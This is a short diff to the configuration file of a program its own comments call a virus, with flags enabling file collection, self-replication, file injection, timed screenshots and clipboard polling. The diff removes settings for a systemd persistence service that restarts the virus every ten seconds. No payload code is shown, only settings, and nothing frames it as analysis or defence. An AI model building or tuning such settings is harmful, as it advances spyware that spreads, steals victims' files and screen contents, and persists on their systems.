@@ -25,10 +25,6 @@ ENABLE_FILE_COLLECTION = True
 ENABLE_SELF_REPLICATION = True
 ENABLE_FILE_INJECTION = True
 
-# Persistence Configuration
-PERSISTENCE_AUTO_RESTART = False  # If True, systemd service will restart virus every 10s if it dies
-PERSISTENCE_RESTART_SEC = 10  # Seconds to wait before restart (only if AUTO_RESTART is True)
-
 # Timing Configuration
 SCREENSHOT_INTERVAL = 30
 CLIPBOARD_CHECK_INTERVAL = 1
